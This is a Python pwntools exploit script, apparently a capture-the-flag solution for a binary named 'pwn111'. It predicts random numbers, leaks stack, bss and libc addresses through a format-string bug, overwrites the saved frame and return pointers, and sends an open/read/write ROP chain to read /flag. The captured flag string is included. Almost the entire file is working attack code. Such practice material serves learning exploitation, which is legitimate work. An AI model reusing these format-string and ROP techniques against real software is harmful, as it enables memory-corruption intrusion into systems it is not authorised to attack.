#! /usr/bin/env python3
from pwn import *
from ctypes import *
context(os = 'linux', arch='amd64')
context(log_level='debug')
context.terminal = ['tmux','splitw','-h']
# p = remote('47.242.20.238','7777')
p = process('./pwn111')
libc = ELF("./libc-2.23.so")
#p = gdb.debug('./pwn111',"break mymain")
payload1 = b'a' * 24 + p32(1)
c = cdll.LoadLibrary("/lib/x86_64-linux-gnu/libseccomp.so.2")
c.srand(1)

def debug():
    gdb.attach(p)
    pause()

p.recvuntil(b'name\n')
p.sendline(payload1)

for i in range(10):
    p.recvuntil(b"number:")
    p.sendline(str(c.rand()).encode())

p.recvuntil(b'try your best!')
payload2 = b'%15$p%1$p%13$p%11$p'
p.sendline(payload2)



p.recvuntil(b'0x')
stack_addr=int(p.recv(12),16)
print('stack_addr: ' + hex(stack_addr))

p.recvuntil(b'0x')
bss=int(p.recv(12),16) - 19
print('bss: ' + hex(bss))

bss_start = bss

p.recvuntil(b'0x')
libc_main=int(p.recv(12),16) - 240
print('libc_main: ' + hex(libc_main))

p.recvuntil(b'0x')
mov_addr=int(p.recv(12),16)
print('mov_addr: ' + hex(mov_addr))

libc_base = libc_main - libc.symbols['__libc_start_main']

bss_orw = bss + 16
print('bss_orw: ' + hex(bss_orw))

ret_addr = stack_addr - 0xf0
print('ret_addr: ' + hex(ret_addr))

rbp_addr = stack_addr - 0xf8
print('rbp_addr: ' + hex(rbp_addr))


payload = b'\x00'*200
p.sendline(payload)


payload = "%" + str(rbp_addr & 0xffff) + "c%15$hn"
p.sendline(payload)
payload = b'\x00'*200
p.sendline(payload)
payload = "%" + str(bss_orw & 0xffff) + "c%41$hn"
p.sendline(payload)


payload = b'\x00'*200
p.sendline(payload)

payload = "%" + str((rbp_addr+2) & 0xffff) + "c%15$hn"
p.sendline(payload)
payload = b'\x00'*200
p.sendline(payload)
payload = "%" + str((bss_orw & 0xffff0000) >> 16) + "c%41$hn"
p.sendline(payload)


payload = b'\x00'*200
p.sendline(payload)

payload = "%" + str((rbp_addr+4) & 0xffff) + "c%15$hn"
p.sendline(payload)
payload = b'\x00'*200
p.sendline(payload)
payload = "%" + str((bss_orw & 0xffff00000000) >> 32) + "c%41$hn"
p.sendline(payload)


payload = b'\x00'*200
p.sendline(payload)

payload = "%" + str(ret_addr & 0xffff) + "c%15$hn"
p.sendline(payload)
payload = b'\x00'*200
p.sendline(payload)
payload = "%" + str(0x76) + "c%41$hhn"#一个字节
p.sendline(payload)
payload = b'\x00'*200
p.sendline(payload)

rdi_addr = 0x0000000000021112 + libc_base
rdx_rsi_addr = 0x00000000001151c9 + libc_base

open = 0x0F7130 + libc_base
read = 0x0F7350 + libc_base
write = 0x0F73B0 + libc_base

payload = b'jiaraniloveyou~a' + p64(bss_orw+220) + p64(rdi_addr) + p64(bss_start + 144) + p64(rdx_rsi_addr) + p64(0) + p64(0)+ p64(open) + p64(rdi_addr) + p64(3) + p64(rdx_rsi_addr) + p64(0x50) + p64(bss_start + 0x120) + p64(read) + p64(rdi_addr) + p64(1) + p64(write) + b"/flag"+b'\x00'*3

print(len(payload))
debug()
p.sendline(payload)

p.interactive()


#open('flag',0)
#read('3','flag', 0x50)
#write(1, 'flag', 0x50)
#pop_rdi,flag_str_addr,open,pop_rdi,3,pop_rsi,flag_addr,pop_rdx,0x50,read,pop_rdi,1,write

# SYC{jiaran_hei_hei_jiaran_heihei}